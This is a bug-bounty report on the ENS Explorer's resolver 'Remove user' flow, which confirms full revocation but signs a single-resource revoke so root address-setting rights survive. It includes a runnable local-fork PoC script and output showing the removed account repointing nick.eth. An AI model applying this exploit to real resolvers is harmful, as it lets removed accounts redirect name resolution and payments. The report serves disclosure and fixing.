# 89293 w a critical explorer resolver remove user confirms a full revocation and signs a single resource one leaving the target holding root role set addr&#x20;

**Submitted on Aug 18th 2026 at 12:58:38 UTC by @gzeon for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89293
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Explorer's resolver roles table merges an account's grants from every resource into one row. The sidebar then picks a single name out of that row and builds one name-scoped `authorizeNameRoles(..., false)` call, while the subtitle says "Global roles (all names)" and the confirm dialog says "remove this user from all roles". Grants on every other resource survive. The PoC runs the Explorer's own code to build the transaction, executes it on a local Sepolia fork, and ends with the removed account holding root `ROLE_SET_ADDR` and `nick.eth` resolving through the UniversalResolver to that account's address.

## Vulnerability Details

### The table row merges every resource

`apps/portal/src/lib/roles/resolverRoles.ts:193-215`

```ts
for (const role of roles) {
  const account = role.account.toLowerCase()
  const resource = role.resource.toLowerCase()
  const decoded = decodeResolverRoleBitmap(role.roleBitmap)
  const resolvedName = resourceToName?.get(resource) ?? null

  const existing = grouped.get(account)

  if (existing) {
    existing.roles.push(role)
    existing.decodedRoles.push(...decoded)
    if (resolvedName) existing.resolvedNames.add(resolvedName)
```

The map key is the account. `resource` is read on line 195, used only to look up a display name, and never enters the key. `decodedRoles` flattens the bitmaps of every resource into one array. The repository's own test pins that behaviour, `apps/portal/src/lib/roles/resolverRoles.test.ts:185-197`:

```ts
it('should merge the same account across resources', () => {
  ...
  expect(result).toHaveLength(1)
  expect(result[0].roles).toHaveLength(2)
  expect(result[0].decodedRoles).toEqual(['ROLE_SET_ADDR', 'ROLE_SET_TEXT'])
})
```

The indexer entity carries one `account`, one `resource` and one `roleBitmap` per row (`useResolverOverview.ts:90-98`), and the table feeds those rows in unchanged (`ResolverRolesTable.tsx:102-105`):

```ts
const data = useMemo(
  () => groupRolesByAccount(roles, buildResourceToNameMap(nodes)),
  [roles, nodes],
)
```

### The sidebar collapses the row to one name

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-169`

```ts
const selectedAccount = row?.original.account as Address
const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
const resolvedNames = row?.original.resolvedNames ?? []

const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

`roleName` is the first non-root entry in a `Set` populated in indexer row order. The other names are discarded, and `'(root)'` is discarded whenever the row carries any resolved non-root name.

### The transaction is built from that one name

`ResolverRolesSidebar.tsx:307-321`

```ts
const handleRemoveUser = () => {
  ...
  setPendingAction({
    type: 'remove',
    name: roleName,
    account: selectedAccount,
    roles: decodedRoles,
```

`apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-61` chooses the scope from that string alone:

```ts
const writeParams = revokeResolverRolesWriteParameters(
  walletClient as Parameters<typeof revokeResolverRolesWriteParameters>[0],
  name === ''
    ? { resolverAddress, targetAccount: account, scope: 'root', roles: roles as ResolverRole[] }
    : { resolverAddress, targetAccount: account, scope: 'name', name, roles: roles as ResolverRole[] },
)
```

`scope: 'root'` emits `revokeRootRoles(bitmap, account)`. `scope: 'name'` emits `authorizeNameRoles(dnsEncode(name), bitmap, account, false)`. Either way one transaction is emitted for a row that can hold grants on any number of resources, so every resource except the selected one keeps its grant. A row carrying a resolved non-root name never reaches `revokeRootRoles` at all, so its root grants survive.

### None of the pre-signing copy names the scope

Sidebar subtitle, `ResolverRolesSidebar.tsx:391-395`:

```tsx
{selectedAccount && resolvedNames.length > 0 && (
  <p className="text-sm text-muted-foreground">
    {resolvedNames.includes('(root)')
      ? 'Global roles (all names)'
      : `Roles scoped to ${resolvedNames.filter((n) => n !== '(root)').join(', ')}`}
```

Confirm dialog, `ResolverRolesSidebar.tsx:444-448`:

```tsx
<DialogTitle>Remove user</DialogTitle>
<DialogDescription>
  Are you sure you want to remove this user from all roles? This
  action cannot be undone.
</DialogDescription>
```

Transaction modal, `ResolverRolesSidebar.tsx:340-343`:

```ts
.with({ type: 'remove' }, ({ account }) => ({
  id: REMOVE_RESOLVER_USER_TX_ID,
  title: 'Remove resolver user',
  transactionName: `Remove user ${account}`,
}))
```

The Explorer modal renders only `Remove user ${account}`. It does not render the selected name or the calldata. The one string carrying the scope is the transaction-manager description at `revokeResolverRoles.ts:111`, `` `Revoke resolver roles for ${name || '(root)'}` ``, and the modal overview does not render it.

The Save path collapses identically: `saveMutation` calls `grantResolverRoles` and `revokeResolverRoles` with `name: roleName` (`ResolverRolesSidebar.tsx:195-243`), so unchecking a permission held at root scope emits a name-scoped revoke that changes nothing at root.

`ROLE_SET_ADDR` is bit 0 of the resolver bitmap (`resolverRoles.ts:25`), described in the same file as "Can set address records" (`resolverRoles.ts:61`). Root-resource grants apply to every resource under ENSv2 Enhanced Access Control.

### Preconditions

* The account holds grants at two or more resources, at least one resolving to a name in the resolver's `nodes` list. Add user offers "Root (all nodes)" and each indexed name and stores one scope per grant (`ResolverAddUserSheet.tsx:205`, `:249-260`), so running it twice on the same account produces the state. `resolvedNames` only contains resources present in the node map (`resolverRoles.ts:197,204`).
* The operator can click Remove user: `canManageRoles` requires root `ROLE_SET_ADDR` on the resolver (`routes/resolver/$address/roles/index.tsx:41-50`), and self-removal is blocked (`ResolverRolesSidebar.tsx:353-359`). That gate controls UI access only; the resolver additionally requires the admin variant of every role in the merged bitmap for the call to succeed. A resolver owner initialised with the full role set satisfies both.

## Impact Details

The application tells the operator the transaction removes the account from all roles, the operator approves it in their connected wallet, and the calldata carries a single resource. The account keeps root `ROLE_SET_ADDR`, which is the authority to write the ETH address record of every name that resolver serves.

Steps 6 and 7 of the PoC execute that. The removed account calls `setAddr` on `nick.eth`, a live Sepolia name pointed at the operator's resolver and never inside any revoked scope. `UniversalResolver.resolve` for `nick.eth` then returns the removed account's address instead of `0xb8c2...67d5`. Anyone resolving that name and paying the result pays the removed account.

Alice runs a PermissionedResolver serving her names. She grants Bob root `ROLE_SET_ADDR` for an integration, and later `ROLE_SET_TEXT` on `docs.alice.eth`. The row lists `(root)` and `docs.alice.eth`; the subtitle reads "Global roles (all names)". Alice clicks Remove user, confirms, and signs. The transaction is `authorizeNameRoles(docs.alice.eth, ROLE_SET_ADDR|ROLE_SET_TEXT, bob, false)`. Bob keeps root `ROLE_SET_ADDR` and repoints `alice.eth` at an address he controls.

The two-name variant needs no root grant. An account with `ROLE_SET_ADDR` on `a.alice.eth` and `b.alice.eth` is listed with both names, the subtitle reads "Roles scoped to a.alice.eth, b.alice.eth", and Remove user clears `a.alice.eth` only.

The account was granted the roles legitimately before the bug fires, so the defect is a failure to revoke rather than a new grant. After confirmation the app refetches five times over approximately 17 seconds (`pollForIndexerSync.ts:18-22,60-73`), so the surviving grant reappears in the table.

## References

* `apps/portal/src/lib/roles/resolverRoles.ts:193-215`, `:25`, `:61`, `:197`, `:204`
* `apps/portal/src/lib/roles/resolverRoles.test.ts:185-197`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-169`, `:195-243`, `:307-321`, `:340-343`, `:353-359`, `:391-395`, `:444-448`
* `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-61`, `:111`
* `apps/portal/src/features/resolver/components/ResolverRolesTable.tsx:69-80`, `:102-105`
* `apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx:205`, `:249-260`
* `apps/portal/src/features/resolver/hooks/useResolverOverview.ts:90-98`
* `apps/portal/src/routes/resolver/$address/roles/index.tsx:41-50`, `:86-91`
* `apps/portal/src/utils/query/pollForIndexerSync.ts:18-22`, `:60-73`
* `@ensdomains/ensjs` `dist/actions/wallet/v2/revokeResolverRoles.js`, `revokeResolverRolesWriteParameters`
* ENSv2 Enhanced Access Control root-resource inheritance, `contracts/src/access-control/EnhancedAccessControl.sol`

Present from repository import `cda79ac` (`fork ensdomains/apps-monorepo at 63772fd872af472ced58b009499355f3430c2a86`) through audited commit `1c9b47f`.

## Proof of Concept

### What the operator does in the Explorer

This is the user-facing sequence. Do not run it against public Sepolia; the runnable PoC below reproduces every step on a local fork.

{% stepper %}
{% step %}

## Add root-scoped access

On a PermissionedResolver you administer, open `/resolver/<resolver>/roles`, click Add user, enter account `B`, select scope "Root (all nodes)", tick Set Address, save.
{% endstep %}

{% step %}

## Add name-scoped access

Click Add user again, enter the same account `B`, select one name from the resolver's node list, tick Set Text, save.
{% endstep %}

{% step %}

## Reload the roles page

Reload `/resolver/<resolver>/roles`. `B` is a single row whose Name cell lists `(root)` and that name.
{% endstep %}

{% step %}

## Open the row

The subtitle reads "Global roles (all names)".
{% endstep %}

{% step %}

## Remove the user

Click Remove user. The dialog reads "Are you sure you want to remove this user from all roles? This action cannot be undone." Confirm and sign.
{% endstep %}

{% step %}

## Review the transaction

The transaction the wallet is asked to sign is `authorizeNameRoles(<the one name>, <merged bitmap>, B, false)`. No `revokeRootRoles` transaction is produced.
{% endstep %}

{% step %}

## Observe surviving root access

`hasRootRoles(1, B)` on the resolver is still true, and `B` can still call `setAddr` for any name that resolver serves.
{% endstep %}
{% endstepper %}

### Runnable end to end

Everything runs locally against an `anvil` fork of Sepolia. No transaction is broadcast to a public network; `anvil` only reads Sepolia state over RPC. The transaction the operator signs in step 5 is produced by the Explorer's own `groupRolesByAccount` and `prepareRevokeResolverRolesTransaction`, not hand-written. Step 7 is the control: the same `setAddr`, with identical arguments, after the root-scope revoke the Explorer never sends.

Requirements: the audited repository at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae` with `pnpm install --frozen-lockfile` already run, Node 22 or newer, Python 3, and Foundry (`anvil`, `cast`).

Save as `poc.sh` and run `REPO=/path/to/audit-comp-ens bash poc.sh`.

{% code title="poc.sh" %}

```bash
#!/usr/bin/env bash
# PoC: the ENS Explorer's resolver "Remove user" confirms a full revocation and
# signs a single-resource one. The removed account keeps root ROLE_SET_ADDR and
# repoints a live ENS name at itself.
#
# Everything runs against a local anvil fork of Sepolia. No transaction is
# broadcast to a public network; anvil only reads Sepolia state over RPC.
#
# Requires: the audited repo at commit 1c9b47f with `pnpm install --frozen-lockfile`
# already run, Node 22+, Python 3, and Foundry (anvil, cast).
#
#   REPO=/path/to/audit-comp-ens bash poc.sh
set -euo pipefail
REPO="${REPO:?set REPO to the audit-comp-ens checkout}"
FORK_RPC="${FORK_RPC:-https://sepolia.gateway.tenderly.co}"
RPC=http://127.0.0.1:8545
EMIT_TEST="$REPO/apps/portal/src/__poc_emit__.test.ts"

# Sepolia addresses, read from the app's own chain config
# (extendChainWithEns(sepolia).contracts).
IMPL=0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e     # ensPermissionedResolverImpl
FACTORY=0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef  # ensVerifiableFactory
REGISTRY=0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e # ensLegacyRegistry
UR=0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe       # ensUniversalResolver
ROLES_ALL=0x1111111111111111111111111111111111111111111111111111111111111111
ROLE_SET_ADDR=1    # resolverRoles.ts:25   1n << 0n
ROLE_SET_TEXT=16   # resolverRoles.ts:27   1n << 4n
ZERO32=0x0000000000000000000000000000000000000000000000000000000000000000

# anvil default accounts. OPERATOR is the resolver admin, TARGET is the account
# the operator removes through the UI.
OPERATOR=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
OPERATOR_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
TARGET=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
TARGET_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

SCOPED_NAME=a.example.eth  # the one name-scoped grant
LIVE_NAME=nick.eth         # a real Sepolia name served by the operator's resolver

dnsencode() { python3 -c "import sys;print(''.join('%02x%s'%(len(l),l.encode().hex()) for l in sys.argv[1].split('.'))+'00')" "$1"; }
resolve_addr() { cast call $UR "resolve(bytes,bytes)(bytes,address)" "0x$(dnsencode "$1")" "$(cast calldata 'addr(bytes32)' "$(cast namehash "$1")")" --rpc-url $RPC | head -1; }

echo "### 0. local Sepolia fork"
anvil --fork-url "$FORK_RPC" --port 8545 --silent &
ANVIL=$!
trap 'kill $ANVIL 2>/dev/null || true; rm -f "$EMIT_TEST"' EXIT
until cast block-number --rpc-url $RPC >/dev/null 2>&1; do sleep 2; done
echo "forked Sepolia at block $(cast block-number --rpc-url $RPC), chain id $(cast chain-id --rpc-url $RPC)"
echo "nothing below depends on recent chain state; every contract used is long deployed"

echo
echo "### 1. the operator deploys the PermissionedResolver it administers"
INIT=$(cast calldata "initialize(address,uint256,bytes[])" $OPERATOR $ROLES_ALL "[]")
RESOLVER=$(cast call $FACTORY "deployProxy(address,uint256,bytes)(address)" $IMPL 1 "$INIT" --from $OPERATOR --rpc-url $RPC)
cast send $FACTORY "deployProxy(address,uint256,bytes)(address)" $IMPL 1 "$INIT" --private-key $OPERATOR_KEY --rpc-url $RPC >/dev/null
echo "resolver = $RESOLVER"

echo
echo "### 2. setup: point a real Sepolia name at that resolver"
NODE=$(cast namehash $LIVE_NAME)
echo "$LIVE_NAME resolves to $(resolve_addr $LIVE_NAME)  (before)"
OWNER=$(cast call $REGISTRY "owner(bytes32)(address)" "$NODE" --rpc-url $RPC)
cast rpc anvil_impersonateAccount "$OWNER" --rpc-url $RPC >/dev/null
cast rpc anvil_setBalance "$OWNER" 0xde0b6b3a7640000 --rpc-url $RPC >/dev/null
cast send $REGISTRY "setResolver(bytes32,address)" "$NODE" "$RESOLVER" --from "$OWNER" --unlocked --rpc-url $RPC >/dev/null
echo "registry resolver($LIVE_NAME) = $(cast call $REGISTRY 'resolver(bytes32)(address)' "$NODE" --rpc-url $RPC)"

echo
echo "### 3. the operator grants the target two scopes, one root and one name"
cast send $RESOLVER "grantRootRoles(uint256,address)(bool)" $ROLE_SET_ADDR $TARGET --private-key $OPERATOR_KEY --rpc-url $RPC >/dev/null
cast send $RESOLVER "authorizeNameRoles(bytes,uint256,address,bool)(bool)" "0x$(dnsencode $SCOPED_NAME)" $ROLE_SET_TEXT $TARGET true --private-key $OPERATOR_KEY --rpc-url $RPC >/dev/null
# resource(name) = keccak256(abi.encodePacked(namehash(name), bytes32(0))),
# the same derivation as computeNameResource in resolverRoles.ts.
RES_SCOPED=$(cast keccak "$(cast abi-encode 'f(bytes32,bytes32)' "$(cast namehash $SCOPED_NAME)" $ZERO32)")
echo "before: hasRootRoles(ROLE_SET_ADDR, target)             = $(cast call $RESOLVER 'hasRootRoles(uint256,address)(bool)' $ROLE_SET_ADDR $TARGET --rpc-url $RPC)"
echo "before: hasRoles($SCOPED_NAME, ROLE_SET_TEXT, target) = $(cast call $RESOLVER 'hasRoles(uint256,uint256,address)(bool)' $RES_SCOPED $ROLE_SET_TEXT $TARGET --rpc-url $RPC)"

echo
echo "### 4. ask the Explorer's own code what Remove user builds for that row"
cat > "$EMIT_TEST" <<'ENDOFTS'
import { describe, it } from 'vitest'
import { createWalletClient, http, type Address, type Hex } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import {
  buildResourceToNameMap, computeNameResource, groupRolesByAccount,
  resolverRoles, type ResolverRoleKey,
} from '@/lib/roles/resolverRoles'
import { prepareRevokeResolverRolesTransaction } from '@/features/resolver/helpers/revokeResolverRoles'

describe('emit', () => {
  it('prints what Remove user builds', () => {
    const TARGET = process.env.POC_TARGET as Address
    const NAME = process.env.POC_NAME as string
    // The indexer returns one row per (account, resource): one root grant and
    // one name grant for the same account.
    const row = groupRolesByAccount(
      [
        { account: TARGET, resource: `0x${'0'.repeat(64)}`,
          roleBitmap: `0x${resolverRoles.ROLE_SET_ADDR.toString(16)}` },
        { account: TARGET, resource: computeNameResource(NAME),
          roleBitmap: `0x${resolverRoles.ROLE_SET_TEXT.toString(16)}` },
      ],
      buildResourceToNameMap([{ name: NAME }]),
    )[0]
    const roleName = row.resolvedNames.find((n) => n !== '(root)') ?? ''  // sidebar:169
    const decodedRoles = row.decodedRoles as ResolverRoleKey[]            // sidebar:166
    const subtitle = row.resolvedNames.includes('(root)')                 // sidebar:393-395
      ? 'Global roles (all names)'
      : `Roles scoped to ${row.resolvedNames.filter((n) => n !== '(root)').join(', ')}`
    const intent = prepareRevokeResolverRolesTransaction({
      resolverAddress: process.env.POC_RESOLVER as Address,
      name: roleName,
      account: TARGET,
      roles: decodedRoles,
      walletClient: createWalletClient({
        account: privateKeyToAccount(process.env.POC_OPERATOR_KEY as Hex),
        chain: sepolia, transport: http('http://127.0.0.1:0'),
      }),
      chainId: sepolia.id,
    })
    console.log(`POC_ROW_NAMES=${row.resolvedNames.join(' + ')}`)
    console.log(`POC_ROW_ROLES=${row.decodedRoles.join(' + ')}`)
    console.log(`POC_SUBTITLE=${subtitle}`)
    console.log(`POC_ROLENAME=${roleName}`)
    console.log(`POC_CALLDATA=${(intent as { request: { data: Hex } }).request.data}`)
  })
})
ENDOFTS
EMIT=$(cd "$REPO" && POC_RESOLVER=$RESOLVER POC_TARGET=$TARGET POC_NAME=$SCOPED_NAME POC_OPERATOR_KEY=$OPERATOR_KEY \
  pnpm --filter portal exec vitest run --reporter=verbose src/__poc_emit__.test.ts 2>&1 | grep '^POC_')
rm -f "$EMIT_TEST"
echo "$EMIT"
CALLDATA=$(echo "$EMIT" | sed -n 's/^POC_CALLDATA=//p')
echo "decoded: authorizeNameRoles($(cast calldata-decode 'authorizeNameRoles(bytes,uint256,address,bool)' "$CALLDATA" | tr '\n' ' '))"
echo 'confirm dialog: "Are you sure you want to remove this user from all roles? This action cannot be undone."'

echo
echo "### 5. the operator signs exactly those bytes"
cast send $RESOLVER "$CALLDATA" --private-key $OPERATOR_KEY --rpc-url $RPC >/dev/null
echo "after:  hasRootRoles(ROLE_SET_ADDR, target)             = $(cast call $RESOLVER 'hasRootRoles(uint256,address)(bool)' $ROLE_SET_ADDR $TARGET --rpc-url $RPC)"
echo "after:  hasRoles($SCOPED_NAME, ROLE_SET_TEXT, target) = $(cast call $RESOLVER 'hasRoles(uint256,uint256,address)(bool)' $RES_SCOPED $ROLE_SET_TEXT $TARGET --rpc-url $RPC)"

echo
echo "### 6. the removed account repoints a name that was never in the revoked scope"
cast send $RESOLVER "setAddr(bytes32,uint256,bytes)" "$NODE" 60 $TARGET --private-key $TARGET_KEY --rpc-url $RPC >/dev/null
echo "$LIVE_NAME resolves to $(resolve_addr $LIVE_NAME)  (after)"
echo "target is                                                                     $TARGET"

echo
echo "### 7. control: same setAddr, after the root-scope revoke the Explorer never sent"
cast send $RESOLVER "revokeRootRoles(uint256,address)(bool)" $ROLE_SET_ADDR $TARGET --private-key $OPERATOR_KEY --rpc-url $RPC >/dev/null
echo "hasRootRoles(ROLE_SET_ADDR, target) = $(cast call $RESOLVER 'hasRootRoles(uint256,address)(bool)' $ROLE_SET_ADDR $TARGET --rpc-url $RPC)"
set +e
ERR=$(cast send $RESOLVER "setAddr(bytes32,uint256,bytes)" "$NODE" 60 $TARGET --private-key $TARGET_KEY --rpc-url $RPC 2>&1)
set -e
echo "identical setAddr now reverts: $(echo "$ERR" | grep -oE 'EACUnauthorizedAccountRoles\([^)]*\)' | head -1)"
```

{% endcode %}

### Output

```
### 0. local Sepolia fork
forked Sepolia at block 11515157, chain id 11155111
nothing below depends on recent chain state; every contract used is long deployed

### 1. the operator deploys the PermissionedResolver it administers
resolver = 0xB6A725C63DBcD7755508E8AF5d88F8C6611b846d

### 2. setup: point a real Sepolia name at that resolver
nick.eth resolves to 0x000000000000000000000000b8c2c29ee19d8307cb7255e1cd9cbde883a267d5  (before)
registry resolver(nick.eth) = 0xB6A725C63DBcD7755508E8AF5d88F8C6611b846d

### 3. the operator grants the target two scopes, one root and one name
before: hasRootRoles(ROLE_SET_ADDR, target)             = true
before: hasRoles(a.example.eth, ROLE_SET_TEXT, target) = true

### 4. ask the Explorer's own code what Remove user builds for that row
POC_ROW_NAMES=(root) + a.example.eth
POC_ROW_ROLES=ROLE_SET_ADDR + ROLE_SET_TEXT
POC_SUBTITLE=Global roles (all names)
POC_ROLENAME=a.example.eth
POC_CALLDATA=0xbbd9abb50000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000001100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0161076578616d706c6503657468000000000000000000000000000000000000
decoded: authorizeNameRoles(0x0161076578616d706c650365746800 17 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 false )
confirm dialog: "Are you sure you want to remove this user from all roles? This action cannot be undone."

### 5. the operator signs exactly those bytes
after:  hasRootRoles(ROLE_SET_ADDR, target)             = true
after:  hasRoles(a.example.eth, ROLE_SET_TEXT, target) = false

### 6. the removed account repoints a name that was never in the revoked scope
nick.eth resolves to 0x00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8  (after)
target is                                                                     0x70997970C51812dc3A010C7d01b50e0d17dc79C8

### 7. control: same setAddr, after the root-scope revoke the Explorer never sent
hasRootRoles(ROLE_SET_ADDR, target) = false
identical setAddr now reverts: EACUnauthorizedAccountRoles(22467049724967347515624198648055648123266869211748604603403820473303087291765 [2.246e76], 1, 0x70997970C51812dc3A010C7d01b50e0d17dc79C8)
```

### Reading the transcript

* Step 2 models the ordinary setup: `nick.eth` resolves to `0xb8c2...67d5` on Sepolia, and its registry resolver is pointed at the operator's PermissionedResolver.
* Step 3 establishes the legitimate prior state: the target holds root `ROLE_SET_ADDR` and `ROLE_SET_TEXT` on `a.example.eth`.
* Step 4 is the Explorer's own code. It produces one row named `(root) + a.example.eth`, labels it "Global roles (all names)", picks `a.example.eth`, and emits `authorizeNameRoles(0x0161076578616d706c650365746800, 17, target, false)`. `17` is `0x11`, the merged `ROLE_SET_ADDR|ROLE_SET_TEXT`.
* Step 5 signs those exact bytes. `hasRootRoles(ROLE_SET_ADDR, target)` is still `true`. Only the name scope was cleared.
* Step 6 has the removed account write `nick.eth`'s ETH address record. The UniversalResolver now resolves `nick.eth` to `0x7099...79c8`, the target's own address.
* Step 7 changes one variable. `revokeRootRoles(ROLE_SET_ADDR, target)` sets `hasRootRoles` to `false`, and the identical `setAddr` reverts with `EACUnauthorizedAccountRoles`.

The fork block number in the transcript is whatever the RPC's head was at run time. Nothing in the PoC depends on recent chain state.

## Suggested fix

Key `groupRolesByAccount` on `(account, resource)` so each scope is its own row and each Remove or Save acts on one resource. If the merged row is kept for display, Save and Remove must iterate `row.roles`, which already carries the original `resource` and per-resource bitmap, and emit one transaction per resource, using `scope: 'root'` for `ROOT_RESOURCE`. Either way the confirm dialog and the transaction modal should name the scope being changed.
